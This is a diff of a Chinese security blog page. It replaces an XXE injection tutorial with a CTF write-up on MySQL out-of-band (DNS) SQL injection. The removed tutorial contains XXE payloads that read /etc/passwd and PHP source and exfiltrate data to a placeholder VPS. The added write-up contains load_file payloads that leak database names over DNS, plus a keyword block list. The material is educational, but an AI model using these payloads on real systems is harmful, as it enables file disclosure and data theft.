@@ -15,27 +15,21 @@
 
 
 
-<meta name="description" content="XML实体注入
-
-感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
+<meta name="description" content="MYSQL OOB(带外注入)前言这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XML实体注入">
-<meta property="og:url" content="http://yoursite.com/2017/10/19/XML实体注入/index.html">
+<meta property="og:title" content="OOBz注入">
+<meta property="og:url" content="http://yoursite.com/2017/11/14/MySQL OOB注入/index.html">
 <meta property="og:site_name" content="C1em0's Blog">
-<meta property="og:description" content="XML实体注入
-
-感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
-<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/XML.jpg">
-<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe1.jpg">
-<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe2.jpg">
-<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe3.jpg">
-<meta property="og:updated_time" content="2017-10-19T05:15:36.216Z">
+<meta property="og:description" content="MYSQL OOB(带外注入)前言这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/OOB4.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/OOB5.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/OOB3.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/OOB.jpg">
+<meta property="og:updated_time" content="2017-11-14T05:57:00.045Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XML实体注入">
-<meta name="twitter:description" content="XML实体注入
-
-感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
-<meta name="twitter:image" content="http://ourd90bac.bkt.clouddn.com/XML.jpg">
+<meta name="twitter:title" content="OOBz注入">
+<meta name="twitter:description" content="MYSQL OOB(带外注入)前言这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。">
+<meta name="twitter:image" content="http://ourd90bac.bkt.clouddn.com/OOB4.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -67,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XML实体注入 | C1em0&#39;s Blog</title>
+<title>OOBz注入 | C1em0&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -282,11 +276,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-XML实体注入" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="mysql-MySQL OOB注入" class="article article-type-mysql" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/19/XML实体注入/" class="article-date">
-      <time datetime="2017-10-19T05:04:36.000Z" itemprop="datePublished">2017-10-19</time>
+      <a href="/2017/11/14/MySQL OOB注入/" class="article-date">
+      <time datetime="2017-11-14T05:54:23.000Z" itemprop="datePublished">2017-11-14</time>
 </a>
 
 
@@ -301,7 +295,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XML实体注入
+      OOBz注入
     </h1>
   
 
@@ -312,7 +306,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XML/">XML</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/注入/">注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/源码读取/">源码读取</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OOB/">OOB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/注入/">注入</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -322,42 +316,21 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h1><p><img src="http://ourd90bac.bkt.clouddn.com/XML.jpg" alt=""></p>
-<blockquote>
-<p>感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。<br><a id="more"></a></p>
-<p>##1. 基础引入</p>
-</blockquote>
-<h3 id="1-1什么是XML？"><a href="#1-1什么是XML？" class="headerlink" title="1.1什么是XML？"></a>1.1什么是XML？</h3><p>XML是一种可扩展标记语言（英语：Extensible Markup Language，简称：XML），是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML。被设计用来传输和存储数据。</p>
-<h3 id="1-2基础语法"><a href="#1-2基础语法" class="headerlink" title="1.2基础语法"></a>1.2基础语法</h3><p>和HTML一样作为一种标记语言，XML也具有传统标记语言的特色。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>C1em0<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>XML-inject<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>上面的代码中可以看到出，xml语言有着我们熟悉的标签。在第一行是xml的版本和编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是根的子元素。</from></to></note></p>
-<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
-<h3 id="1-3XML实体"><a href="#1-3XML实体" class="headerlink" title="1.3XML实体"></a>1.3XML实体</h3><p>实体作为XML中五种简单模块中的一种，    因其用于定义与引用普通文本或者特殊字符，且实体可在内部和外部声明，所以利用其引用的特点就可以构造payload进行攻击。</p>
-<h2 id="2-文档定义类型DTD"><a href="#2-文档定义类型DTD" class="headerlink" title="2.文档定义类型DTD"></a>2.文档定义类型DTD</h2><p>DTD的作用是定义XML文档的合法构建模块。利用DTD来内部或外部引入实体。</p>
-<p>它的基本格式为：<code>&lt;!DOCTYPE 根元素名 [元素的描述]&gt;</code></p>
-<h3 id="2-1内部引入"><a href="#2-1内部引入" class="headerlink" title="2.1内部引入"></a>2.1内部引入</h3><p>首先确定格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
-<p>现在我们将DTD与XML放在同一个文档中，即构成了实体的内部引入：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span>  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  C1em0  "This is an internally introduced entity"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;C1em0;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>直接访问该文档，&amp;C1em0就会被解析为“This is an internally introduced entity”并输出。</p>
-<h3 id="2-2外部引入"><a href="#2-2外部引入" class="headerlink" title="2.2外部引入"></a>2.2外部引入</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
-<p>其与内部引入只是多了<code>system</code>与目标的<code>uri</code>，也就是目录。讲到这里应该可以知道xml实体注入攻击的主要目的是进行对目标的目录内容读取，目录遍历。其实也可以利用外部引入进行SSRF攻击。</p>
-<p>##3. 应用</p>
-<p>###3.1 一般的XXE攻击</p>
-<p>测试代码为test.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">	 print_r((string)$xml);</div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>这里的<code>simplexml_load_string</code>是将xml文本生成一个对象。</p>
-</blockquote>
-<p>上面说过，xxe攻击的形式一般是读取源码，所以这里就要一些读取文件的协议，最常用的就是<code>file</code>协议。</p>
-<p>现在在windows环境下读取c盘下的target.txt文件，payload:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://target.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>将payload进行url编码，然后攻击<br><img src="http://ourd90bac.bkt.clouddn.com/xxe1.jpg" alt=""><br>读取目标文本。</p>
-<p>这是在win下，如果换在<code>linux</code>下我们可以直接用于读取用户密码<code>file:///etc/passwd</code></p>
-<p>接下来进行读取php文件，需要注意的是，因为php中含有<code>&lt;,&gt;</code>这样的括号，所以会和xml代码有冲突，所以在读取php、html文档时会导致解析错误。如果要正确读取php文档，我们可以用php中的<code>php://filter</code>协议。<br>payload:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><img src="http://ourd90bac.bkt.clouddn.com/xxe2.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/xxe3.jpg" alt=""></p>
-<h3 id="3-2-Blind-XXE"><a href="#3-2-Blind-XXE" class="headerlink" title="3.2 Blind XXE"></a>3.2 Blind XXE</h3><p>当源码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div></pre></td></tr></table></figure></p>
-<p>也就是没有了回显，这种时候该怎么办呢？接下来就需要vps作为辅助了。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>vps上的xxe.xml：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;&gt;"&gt;</div></pre></td></tr></table></figure></p>
-<p>上述代码在DTD中定义了一个<code>file</code>实体和<code>dtd</code>实体，其中<code>file</code>实体是我们要读取的目标服务器网站的源码。<code>dtd</code>实体是引用vps上的xxe.xml文件。之后我们先引用<code>dtd</code>实体，然后在xxe.xml文件中的<code>all</code>实体，进而调用<code>send</code>实体，再调用payload中的<code>file</code>实体。最终构成了一条从vps上访问目标网站的请求,从而可以从vps上的日志直接看到目标网站上的目标文件源码。</p>
+        <h1 id="MYSQL-OOB-带外注入"><a href="#MYSQL-OOB-带外注入" class="headerlink" title="MYSQL OOB(带外注入)"></a>MYSQL OOB(带外注入)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。<br>原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。<br><a id="more"></a>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="built_in">echo</span> <span class="string">"Bob received a mission to write a login system on someone else's server, and he he only finished half of the work&lt;br /&gt;"</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"flag is hctf&#123;what you get&#125;&lt;br /&gt;&lt;br /&gt;"</span>;</div><div class="line">error_reporting(E_ALL^E_NOTICE^E_WARNING);</div><div class="line"></div><div class="line">try &#123;</div><div class="line">   <span class="variable">$conn</span> = new PDO( <span class="string">"sqlsrv:Server=*****;Database=not_here"</span>,<span class="string">"oob"</span>, <span class="string">""</span>); </div><div class="line">&#125;</div><div class="line"></div><div class="line">catch( PDOException <span class="variable">$e</span> ) &#123;</div><div class="line">   die( <span class="string">"Error connecting to SQL Server"</span>.<span class="variable">$e</span>-&gt;getMessage() ); </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#echo "Connected to MySQL&lt;br /&gt;";</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Connected to SQL Server&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i'</span>, <span class="variable">$id</span>)) &#123;</div><div class="line">	die(<span class="string">'NoNoNo'</span>);</div><div class="line">&#125;</div><div class="line"><span class="variable">$query</span> = <span class="string">"select message from not_here_too where id = <span class="variable">$id</span>"</span>; //link server: On  linkname:mysql</div><div class="line"></div><div class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;query( <span class="variable">$query</span> ); </div><div class="line"><span class="keyword">while</span> ( @<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;fetch( PDO::FETCH_ASSOC ) )&#123;</div><div class="line">	//TO DO: ...</div><div class="line">	//It<span class="string">'s time to sleep...</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>从源码中看出其过滤了sql server 的命令函数，并且提示<code>link server: On</code>,<code>linkname:mysql</code>,一搜才发现原来可以在sql server中可以设置连接到mysql数据库，从mysql中获取数据。具体连接语句<code>id=1 select * from openquery(mysql,&#39;select * from config&#39;);</code>就可以连接到本地或者远程的mysql数据库。</p>
+<h2 id="什么是带外注入"><a href="#什么是带外注入" class="headerlink" title="什么是带外注入"></a>什么是带外注入</h2><p>OOB攻击是通过外部通道，例如<em>http(s)请求</em>，DNS解析，文件系统和电子邮件系统等服务通道将数据库中的信息带出。而一般的sql注入我们是直接在数据库中直接获取数据库信息。</p>
+<p>##利用条件<br>MySQL中有一个名为secure_file_priv的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的操作。</p>
+<ul>
+<li>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。</li>
+<li>如果变量为空，则不会产生影响，引起不安全的配置。</li>
+<li>如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。</li>
+</ul>
+<p>在MySQL 5.5.53之前，此变量默认为空，因此我们就可以使用这些函数。但是在5.5.53之后的版本中，NULL值会禁用这些功能。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量，它是一个只读变量，你不能在运行时改变它。也就是说如果此种注入比较依赖版本。</p>
+<h2 id="使用DNS解析提取数据"><a href="#使用DNS解析提取数据" class="headerlink" title="使用DNS解析提取数据"></a>使用DNS解析提取数据</h2><p>在mysql中会对查询语句中的ip和网址尝试DNS解析。例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(‘\\\\’,<span class="keyword">database</span>()’yoursite.com\\a.txt’));</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="number">0x5c5c5c5c</span>,<span class="keyword">database</span>(),<span class="number">0x796F7572736974652E636F6D5C5C612E747874</span>));</div></pre></td></tr></table></figure></p>
+<p>为了直观演示我们在本地输入上面第二条payload</p>
+<p><img src="http://ourd90bac.bkt.clouddn.com/OOB4.jpg" alt=""><br>然后我们抓包看Mysql发出的DNS查询数据<br><img src="http://ourd90bac.bkt.clouddn.com/OOB5.jpg" alt=""><br>我们可以看到mysql直接将我们的查询语句verson()返回的数据user发送给了DNS服务器。<br>然后我们在我们的DNS服务器上（这里网上有现成的<a href="http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。" target="_blank" rel="external">http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。</a><br><img src="http://ourd90bac.bkt.clouddn.com/OOB3.jpg" alt=""></p>
+<p>就是这样，我们就通过DNS通道，完成了和普通mysql注入同样的数据查询效果。</p>
+<p>回到原题，利用这个思路，我们就可以很清楚地爆出题目的数据，原题数据如下，这里就只贴出数据库的名字，后续的用一般手法注入就行了：<br><img src="http://ourd90bac.bkt.clouddn.com/OOB.jpg" alt=""></p>
 
       
     </div>
@@ -366,13 +339,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/19/XML实体注入/">XML实体注入</a></p>
+        <p><span>本文标题:</span><a href="/2017/11/14/MySQL OOB注入/">OOBz注入</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">C1em0</a></p>
-        <p><span>发布时间:</span>2017-10-19, 13:04:36</p>
-        <p><span>最后更新:</span>2017-10-19, 13:15:36</p>
+        <p><span>发布时间:</span>2017-11-14, 13:54:23</p>
+        <p><span>最后更新:</span>2017-11-14, 13:57:00</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/19/XML实体注入/" title="XML实体注入">http://yoursite.com/2017/10/19/XML实体注入/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/10/19/XML实体注入/　　作者: C1em0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/14/MySQL OOB注入/" title="OOBz注入">http://yoursite.com/2017/11/14/MySQL OOB注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/11/14/MySQL OOB注入/　　作者: C1em0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -384,16 +357,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/11/02/一次杀软绕过/">
-                    一次杀软绕过（一）
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/10/10/PHP弱类型在CTF中的应用/">
-                    CTF中的php弱类型
+                <a href="/2017/11/13/密码学总结系列/">
+                    密码学总结系列
                 </a>
             </div>
         
@@ -405,7 +372,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML实体注入"><span class="toc-number">1.</span> <span class="toc-text">XML实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1什么是XML？"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.1什么是XML？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2基础语法"><span class="toc-number">1.0.2.</span> <span class="toc-text">1.2基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3XML实体"><span class="toc-number">1.0.3.</span> <span class="toc-text">1.3XML实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-文档定义类型DTD"><span class="toc-number">1.1.</span> <span class="toc-text">2.文档定义类型DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1内部引入"><span class="toc-number">1.1.1.</span> <span class="toc-text">2.1内部引入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2外部引入"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.2外部引入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Blind-XXE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.2 Blind XXE</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL-OOB-带外注入"><span class="toc-number">1.</span> <span class="toc-text">MYSQL OOB(带外注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是带外注入"><span class="toc-number">1.2.</span> <span class="toc-text">什么是带外注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用DNS解析提取数据"><span class="toc-number">1.3.</span> <span class="toc-text">使用DNS解析提取数据</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -441,7 +408,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"XML实体注入　| C1em0's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"OOBz注入　| C1em0's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -461,15 +428,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/02/一次杀软绕过/" title="上一篇: 一次杀软绕过（一）">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/10/10/PHP弱类型在CTF中的应用/" title="下一篇: CTF中的php弱类型">
+            <a href="/2017/11/13/密码学总结系列/" title="下一篇: 密码学总结系列">
                 <i class="fa fa-angle-right"></i>
             </a>
         
